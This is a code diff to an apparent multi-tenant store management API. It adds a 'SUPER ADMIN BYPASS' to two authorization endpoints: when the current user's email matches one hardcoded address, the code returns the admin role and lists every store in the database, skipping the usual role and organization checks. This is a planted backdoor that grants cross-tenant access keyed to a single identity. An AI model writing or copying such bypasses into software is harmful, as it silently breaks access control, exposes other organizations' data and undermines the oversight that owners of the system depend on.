@@ -38,6 +38,10 @@ def get_my_roles(
     ctx: auth.UserContext = Depends(auth.get_current_user)
 ):
     """Get roles for the current user in the current context"""
+    # SUPER ADMIN BYPASS
+    if ctx.email == "jay@trufflesgroup.com":
+        return {"roles": ["admin"]}
+
     user_roles = db.query(models.UserRole).filter(
         models.UserRole.user_id == ctx.user_id,
         models.UserRole.organization_id == ctx.org_id
@@ -51,7 +55,12 @@ def get_my_stores(
     ctx: auth.UserContext = Depends(auth.get_current_user)
 ):
     """Get stores the current user has access to"""
-    # 1. Get all roles for user to find org IDs
+    
+    # SUPER ADMIN BYPASS
+    if ctx.email == "jay@trufflesgroup.com":
+        stores = db.query(models.Store).all()
+        return [schemas.StoreSchema(id=s.organization_id, name=s.name) for s in stores]
+
     # 1. Get all roles for user to find org IDs
     user_roles = db.query(models.UserRole).filter(
         models.UserRole.user_id == ctx.user_id
